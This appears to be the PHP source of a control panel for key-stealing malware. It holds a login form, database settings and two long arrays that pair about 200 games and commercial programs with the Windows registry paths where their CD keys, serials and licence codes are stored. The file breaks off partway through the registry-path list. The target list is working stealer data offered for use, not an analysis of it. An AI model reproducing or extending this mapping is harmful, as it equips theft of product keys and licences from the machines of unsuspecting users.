<?php
   $dbHost     = "localhost";
   $dbUser     = "strik";
   $dbPass     = "";
   $dbDatabase = "strike";

   $loginform = "<html><head><title>Log In</title><style type='text/css'>
		.title{font-family: verdana, tahoma, sans-serif;FONT-SIZE: 10px;font-weight:bold}
		div{position:absolute;top:35%;left:40%;}
		input {background-color:#373737;border-color:#E7E7E7;border-width:1px;border-style:solid;color:#E7E7E7;}
		textarea, input, select{background: #FFFFFF;border: 1px solid #CCCCCC;color: #000000;font-family: verdana, tahoma, sans-serif;font-size: 0.95em;}
		.username{background-image:url(images/user_gray.png);background-position: 1px 1px;background-repeat:no-repeat;padding-left:20px;height:20px;FONT-SIZE: 12px;}
		.password{background-image:url(images/lock.png);background-position: 1px 1px;background-repeat:no-repeat;padding-left:20px;height:20px;FONT-SIZE: 12px;}
		</style></head><body>
		<div align='center'><form action='index.php' method='post'>
		<table width='208' border='0' align='center' cellpadding='5' cellspacing='0'><tr>
		<td bgcolor='#F4F4F4' class='title'>+ LOGIN</td></tr><tr><td class='title'>Username</td></tr><tr>
		<td><input name='username' type='text' class='username' size='30'></td>
		</tr><tr><td></td></tr><tr><td class='title'>Password</td></tr><tr>
		<td><input name='password' type='password' class='password' size='30'></td></tr><tr>
		<td align='right'><input type='submit' name='userlogin' value='Login'></td>
		</tr></table></form></div></body></html>";

$kprograms = array("@Stake L0pht CrackLC5" ,"3D Mark 2001 Name" ,"3D Mark 2001 Key" ,"Acronis True Image" ,"Adobe Acrobat 6" ,"Adobe Acrobat 7" ,"Adobe Acrobat 8.x" ,"Adobe Photoshop 7" ,"Advanced Direct Remailer (ADR =>2.20) " ,"Advanced Direct Remailer (ADR <=2.18) " ,"After Effects 7 Name " ,"After Effects 7 Company" ,"After Effects 7 Serial" ,"Alcohol 120% 1.9.x Name" ,"Alcohol 120% 1.9.x Key" ,"Anno 1701" ,"Axailis IconWorkshop 6.0" ,"Battlefield 1942" ,"Battlefield 1942 Road To Rome" ,"Battlefield 1942 Secret Weapons of WWII" ,"Battlefield Vietnam" ,"Beyond TV 4" ,"Beyond TV 4 Link" ,"Beyond Media" ,"BitComet Acceleration Patch" ,"Black and White" ,"Borland Delphi 6 Serial" ,"Borland Delphi 6 Key" ,"Borland Delphi 7 Serial" ,"Borland Delphi 7 Key" ,"Call of Duty 2" ,"Call of Duty 1" ,"Call of Duty 4" ,"Call of Duty WAW" ,"Chrome" ,"Command and Conquer: Generals Zero Hour" ,"Command and Conquer: Tiberian Sun" ,"Command and Conquer: Red Alert" ,"Command and Conquer: Red Alert 2" ,"Command and Conquer: Red Alert 2 Yuri's Revenge" ,"Command and Conquer 3: Tiberium Wars" ,"Company of Heroes Version" ,"Company of Heroes Key" ,"Counter-Strike (Retail)" ,"Crysis" ,"Cyberlink PowerDVD Version" ,"Cyberlink PowerDVD Key" ,"Dell Service Tag" ,"DVD Profiler First Name" ,"DVD Profiler Last Name" ,"DVD Profiler Key" ,"Elaborate Bytes Clone DVD" ,"FIFA 2002" ,"FIFA 2003" ,"Freedom Force" ,"Futuremark 3DMark2001 Name" ,"Futuremark 3DMark2001 Key" ,"Futuremark 3DMark2003" ,"Futuremark 3DMark2005" ,"Futuremark 3DMark2006" ,"Futuremark PCMark2005" ,"GetDataBack Name" ,"GetDataBack Key" ,"GetDataBack for NTFS Name" ,"GetDataBack for NTFS Key" ,"GetRight/Pro" ,"GetRight/Pro Version" ,"GetRight Key" ,"Global Operations" ,"Gunman Chronicles" ,"Half-Life" ,"HDD State Inspector" ,"Hidden & Dangerous 2" ,"IGI 2: Covert Strike" ,"Industry Giant 2" ,"James Bond 007 Nightfire" ,"Legends of Might and Magic Customer Number" ,"LimeWire Acceleration Patch" ,"mIRC Username" ,"mIRC Key" ,"Medal of Honor: Allied Assault" ,"Medal of Honor: Allied Assault: Breakth" ,"Medal of Honor: Allied Assault: Spearhe" ,"Nascar Racing 2002" ,"Nascar Racing 2003" ,"Naturally Speaking 8" ,"Need For Speed Hot Pursuit" ,"Nero Burning Rom Name" ,"Nero Burning Rom Company" ,"Nero Burning Rom 5 Serial" ,"Nero Burning Rom 6 Serial" ,"Nero Burning Rom 7 Name" ,"Nero Burning Rom 7 Company" ,"Nero Burning Rom Version" ,"Nero Burning Rom Serial" ,"NewsBin Pro 5x First Name" ,"NewsBin Pro 5x Last Name" ,"NewsBin Pro 5x Key" ,"NHL 2002" ,"NHL 2003" ,"Norton Antivirus 2006" ,"Norton PartitionMagic 8.x Name" ,"Norton PartitionMagic 8.x Company" ,"Norton PartitionMagix 8.x Serial" ,"NOX" ,"O&O BlueCon 5 Name" ,"O&O BlueCon 5 Company" ,"O&O BlueCon 5 Serial" ,"O&O CleverCache 6 Name" ,"O&O CleverCache 6 Company" ,"O&O CleverCache 6 Serial" ,"O&O Defrag 8 Name" ,"O&O Defrag 8 Company" ,"O&O Defrag 8 Serial" ,"O&O DiskImage 1 Name" ,"O&O DiskImage 1 Company" ,"O&O DiskImage 1 Serial" ,"O&O DiskRecovery 3 Name" ,"O&O DiskRecovery 3 Company" ,"O&O DiskRecovery 3 Serial" ,"O&O DriveLED 2 Name" ,"O&O DriveLED 2 Company" ,"O&O DriveLED 2 Serial" ,"O&O SafeUnErase 2 Name" ,"O&O SafeUnErase 2 Company" ,"O&O SafeUnErase 2 Serial" ,"O&O SafeErase 2 Name" ,"O&O SafeErase 2 Company" ,"O&O SafeErase 2 Serial" ,"Padus DiscJuggler Name" ,"Padus DiscJuggler Serial" ,"PC Icon Editor Name" ,"PC Icon Editor Serial " ,"PowerQuest PartitionMagic" ,"Pro Evolution Soccer 6" ,"Quake 4" ,"Ravenshield" ,"ReplayConverter" ,"Registy Mechanic Name" ,"Registy Mechanic Serial" ,"Roxio My DVD 8 Premier" ,"SecurDataStor v6 Key (Machine)" ,"SecurDataStor v6 Key (User)" ,"SecurDataStor v6 CD-Media Key (Machine)" ,"SecurDataStor v6 CD-Media Key (User)" ,"Shogun: Total War: Warlord Edition" ,"Sims, The" ,"Sims, The Living Large" ,"Sims, The House Party" ,"Sims, The 2 Family Fun Stuff" ,"Sims, The 2 Glamour Life Stuff" ,"Sims, The 2 Nightlife" ,"Sims, The 2 Open for Business" ,"Sims, The 2 Pets" ,"Sims, The 2 Seasons" ,"Sims, The 2 University" ,"SimCity 4 Deluxe" ,"Slysoft AnyDVD" ,"Slysoft CloneCD" ,"Smartversion " ,"Soldiers Of Anarchy" ,"Sonic Record Now!" ,"Sony Vegas 6" ,"Splinter Cell - Chaos Theory" ,"Stardock Serial" ,"SuperCleaner Name" ,"SuperCleaner Serial" ,"Symantec Norton Internet Security 2007" ,"Tag&Rename Name" ,"Tag&Rename Serial" ,"Techsmith Camtasia Studio 3.0 Name" ,"Techsmith Camtasia Studio 3.0 Key" ,"Techsmith Camtasia Studio 4.0" ,"Techsmith SnagIt 8.0 Name" ,"Techsmith SnagIt 8.0 Key" ,"The Gladiators" ,"TGTSoft StyleXP" ,"TMPGEnc Plus 2.5 Name" ,"TMPGEnc Plus 2.5 Company" ,"TMPGEnc Plus 2.5 Serial" ,"Trend Micro PC-cillin Antivirus 11" ,"Trend Micro PC-cillin Antivirus 2007" ,"TuneUP 2006 Name" ,"TuneUP 2006 Company" ,"TuneUP 2006 Key" ,"TuneUP 2007 Name" ,"TuneUP 2007 Company" ,"TuneUP 2007 Key" ,"Unreal Tournament 2003" ,"Unreal Tournament 2004" ,"VMware Server Serial" ,"VMware Workstation 5.0" ,"VSO ConvertX to DVD Version" ,"VSO ConvertX to DVD Key (Machine)" ,"VSO ConvertX to DVD Key (User)" ,"VSO ConvertXtoDVD Version" ,"VSO ConvertXtoDVD Key" ,"Westwood Alarmstufe Rot 2" ,"Westwood Alarmstufe Rot 2 Yuri's Revenge" ,"Westwood Tiberian Sun" ,"Winamp 5 Name" ,"Winamp 5 Serial" ,"WinImage Name" ,"WinImage Key" ,"WinPatrol" ,"WS FTP" ,"
ZoneAlarm Name" ,"ZoneAlarm Company" ,"ZoneAlarm Serial");

$kpaths = array("HKEY_CURRENT_USER\\Software\\@stake\\LC5\\Registration\\Unlock Code" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\MadOnion.com\\Registration2001\\3DMarkRegName" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\MadOnion.com\\Registration2001\\3DMarkRegKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Acronis\\TrueImage\\Registration\\standard" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Adobe Acrobat\\6.0\\Registration\\SERIAL" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Adobe Acrobat\\7.0\\Registration\\SERIAL" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Adobe Acrobat\\8.0\\Registration\\SERIAL" ,"HKEY_LOCaL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration\\SERIAL" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Tweak Marketing\\Advanced Direct Remailer\\Registration\\code" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced Direct Remailer\\Registration\\code" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\After Effects\\7.0\\Registration\\NAME" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\After Effects\\7.0\\Registration\\COMPAN" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\After Effects\\7.0\\Registration\\Serial" ,"HKEY_CURRENT_USER\\Software\\Alcohol Soft\\Alcohol 120%\\Info\\UserName" ,"HKEY_CURRENT_USER\\Software\\Alcohol Soft\\Alcohol 120%\\Info\\ServerKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701\\SerialNo" ,"HKEY_CURRENT_USER\\Software\\Axialis\\IconWorkshop\\registration\\ProductKey" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\egrc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\SnapStream Media\\Beyond TV\\ProductKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\SnapStream Media\\Beyond TV\\NetworkLicense" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\SnapStream Media\\Beyond Media\\ProductKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\BitComet Acceleration Patch\\Serial" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Borland\\Delphi\\6.0\\LMLIC" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Borland\\Delphi\\6.0\\LMKEY" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Borland\\Delphi\\7.0\\LMLIC" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Borland\\Delphi\\7.0\\LMKEY" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2\\codkey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty\\codkey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty 4\\codkey" ,"HKEY_LOCAL_MACHINE\\Software\\Activision\\Call of Duty WAW\\codkey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\techland\\'Chrome'\\serialnumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\electronic arts\\ea games\\command and conquer generals zero hour\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\westwood\\tiberian sun\\serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\westwood\\red alert\\serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Yuri's Revenge\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes\\Version" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes\\ProductKey" ,"HKEY_CURRENT_USER\\Software\\Valve\\CounterStrike\\Settings\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerDVD\\BuildInfo\\Ver" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Dell Computer Corporation\\SysInfo\\SerialNumber" ,"HKEY_CURRENT_USER\\Software\\InterVocative Software\\DVD Profiler\\RegFName" ,"HKEY_CURRENT_USER\\SoftWare\\InterVocative Software\\DVD Profiler\\RegLName" ,"HKEY_CURRENT_USER\\Software\\InterVocative Software\\DVD Profiler\\RegKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Elaborate Bytes\\CloneDVD\\Key\\Key" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\MadOnion.com\\Registration2001\\3DMarkRegName" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\MadOnion.com\\Registration2001\\3DMarkRegKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Futuremark\\3DMark03\\KeyCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Futuremark\\3DMark05\\KeyCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Futuremark\\3DMark06\\KeyCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Futuremark\\PCMark05\\KeyCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Runtime Software\\GetDataBack\\License\\Name" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Runtime Software\\GetDataBack\\License\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Runtime Software\\GetDataBackNT\\License\\Name" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Runtime Software\\GetDataBack\\License\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight\\Which" ,"HKEY_CURRENT_USER\\Software\\Headlight\\GetRight\\InstalledVersion" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight\\GRCode" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc" ,"HKEY_CURRENT_USER\\Software\\Valve\\Gunman\\Settings\\Key" ,"HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\AltrixSoft\\HDD State Inspecto\\Key" ,"HKEY_LOCAL_MACHINE\\Software\\Illusion Softworks\\Hidden & Dangerous 2\\key" ,"HKEY_LOCAL_MACHINE\\Software\\IGI 2 Retail\\CDKey" ,"HKEY_CURRENT_USER\\Software\\JoWooD\\InstalledGames\\IG2\\prvkey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\James Bond 007 Nightfire\\ergc" ,"HKEY_CURRENT_USER\\Software\\3d0\\Status\\CustomerNumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire Acceleration Patch\\Serial" ,"HKEY_CURRENT_USER\\Software\\mIRC\\UserName" ,"HKEY_CURRENT_USER\\Software\\mIRC\\License" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\egrc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\ScanSoft\\NaturallySpeaking8\\Activation\\SerialNumber" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit\\egrc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info\\Serial5" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info\\Serial6*" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Installation\\Families\\Nero 7\\Info\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Installation\\Families\\Nero 7\\Info\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Installation\\Families\\Nero 7\\Info\\Version" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Installation\\Families\\Nero 7\\Info\\Serial7_*" ,"HKEY_CURRENT_USER\\Software\\DJI Interprises\\Newsbin50\\RegNew\\FirstName" ,"HKEY_CURRENT_USER\\Software\\DJI Interprises\\Newsbin50\\RegNew\\LastName" ,"HKEY_CURRENT_USER\\Software\\DJI Interprises\\Newsbin50\\RegNew\\Code1" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\CCPD-LC\\KStore\\00000082\\0000001e\\0000004a\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\Norton PartitionMagic\\8.0\\UserInfo\\Name" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\Norton PartitionMagic\\8.0\\UserInfo\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\Norton PartitionMagic\\8.0\\UserInfo\\SerialNumber" ,"HKEY_LOCAL_MACHINE\\Software\\Westwood\\NOX\\Serial" ,"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\OOBlueConPro\\User" ,"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\OOBlueConPro\\Company" ,"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\OOBlueConPro\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O CleverCache\\6.0\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O CleverCache\\6.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O CleverCache\\6.0\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Defrag\\8.0\\Pro\\licenses\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Defrag\\8.0\\Pro\\licenses\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Defrag\\8.0\\Pro\\licenses\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskImage\\1.0\\Pro\\licenses\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskImage\\1.0\\Pro\\licenses\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskImage\\1.0\\Pro\\licenses\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskRecovery\\3.0\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskRecovery\\3.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DiskRecovery\\3.0\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DriveLED\\2.0\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DriveLED\\2.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O DriveLED\\2.0\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O UnErase\\2.0\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O UnErase\\2.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O UnErase\\2.0\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Safeerase\\2.0\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Safeerase\\2.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\O&O\\O&O Safeerase\\2.0\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Padus\\DiscJuggler\\Settings\\User" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Padus\\DiscJuggler\\Settings\\Registration" ,"HKEY_CURRENT_USER\\Software\\Program4Pc\\PC Icon Editor\\Name" ,"HKEY_CURRENT_USER\\Software\\Program4Pc\\PC Icon Editor\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\PowerQuest\\PartitionMagic\\8.0\\UserInfo\\SerialNumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\KONAMIPES6\\PES6\\code" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\id\\Quake 4\\CDKey" ,"HKEY_LOCAL_MACHINE\\Software\\Red Storm Entertainment\\RAVENSHIELD\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\ReplayConverter\\RegCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\PCTools\\Registry Mechanic\\Settings Owner\\Name" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\PCTools\\Registry Mechanic\\Settings LicenseKey\\serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\roxio\\Registration\\RoxioCentral\\RoxioCentral_SN" ,"HKEY_LOCAL_MACHINE\\Software\\encryptX\\SecurDataStor v6\\Registration\\License" ,"HKEY_CURRENT_USER\\Software\\encryptX\\SecurDataStor v6\\Registration\\License" ,"HKEY_LOCAL_MACHINE\\Software\\encryptX\\SecurDataStor v6\\Registration\\m0" ,"HKEY_CURRENT_USER\\Software\\encryptX\\SecurDataStor v6\\Registration\\m0" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - WarlordEdition\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\The Sims\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\The Sims Livin' Large\\ergc" ,"HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\The Sims House Party\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open for Business\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Pets\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Maxis\\SimCity 4 Deluxe\\ergc" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\SlySoft\\AnyDVD\\Key\\Key" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\SlySoft\\CloneCD\\Key\\Key" ,"HKEY_CURRENT_USER\\Software\\SmartVersion\\RegistrationCode" ,"HKEY_CURRENT_USER\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Sonic\\Registration\\RecordNow\\RecordNow_SN" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Sony Media Software\\Vegas\\6.0\\License\\CurrentKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys\\DiscKey_SCCT" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Stardock\\ComponentManager\\Stardock\\odp\\Serial No" ,"HKEY_CURRENT_USER\\Software\\SuperCleaner\\Registration\\Name" ,"HKEY_CURRENT_USER\\Software\\SuperCleaner\\Registration\\Code" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\CCPD-LC\\KStore\\00000082\\00000049\\000000b9\\Key" ,"HKEY_CURRENT_USER\\Software\\Softpointer\\Tag&Rename\\Config\\Name" ,"HKEY_CURRENT_USER\\Software\\Softpointer\\Tag&Rename\\Config\\cbVQFFtoTagReplaseUnde" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\3.0\\RegisteredTo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\3.0\\RegistrationKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0\\RegistrationKey" ,"HKEY_CURRENT_USER\\Software\\TechSmith\\SnagIt\\8\\RegisteredTo" ,"HKEY_CURRENT_USER\\Software\\TechSmith\\SnagIt\\8\\RegistrationKey" ,"HKEY_CURRENT_USER\\Software\\Eugen Systems\\The Gladiators\\RegNumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TGT Soft\\StyleXP\\RegKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Pegasys Inc.\\TMPGEnc Plus\\2.5\\UserName" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Pegasys Inc.\\TMPGEnc Plus\\2.5\\CompanyName" ,"HKEY_CURRENT_USER\\SOFTWARE\\Pegasys Inc.\\TMPGEnc Plus\\2.5\\SerialID" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TrendMicro\\PC-cillin\\register no." ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TrendMicro\\AntiVirus\\15\\SerialNo" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\5.0\\UserName" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\5.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\5.0\\RegCode" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\6.0\\UserName" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\6.0\\Company" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\TuneUp\\Utilities\\6.0\\RegCode" ,"HKEY_LOCAL_MACHINE\\Software\\Unreal Technology\\Installed Apps\\UT2003\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004\\CDKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Server\\License.vs.1.0-00\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Vmware, Inc.\\Vmware Workstation\\License.ws.5.0\\Serial" ,"HKEY_CURRENT_USER\\Software\\VSO\\ConvertXToDVD\\NetUpdate\\NetUpdate_LastVersion" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\VSO\\ConvertXtoDVD\\LicenseKey" ,"HKEY_CURRENT_USER\\Software\\VSO\\ConvertXToDVD\\LicenseKey" ,"HKEY_CURRENT_USER\\Software\\VSO\\ConvertXToDVD\\NetUpdate\\NetUpdate_LastVersion" ,"HKEY_CURRENT_USER\\Software\\VSO\\ConvertXToDVD\\LicenseKey" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Yuri's Revenge\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun\\Serial" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Nullsoft\\Winamp\\regname" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Nullsoft\\Winamp\\regkey" ,"HKEY_CURRENT_USER\\Software\\WinImage\\NameRegistered" ,"HKEY_CURRENT_USER\\Software\\WinImage\\CodeRegistered" 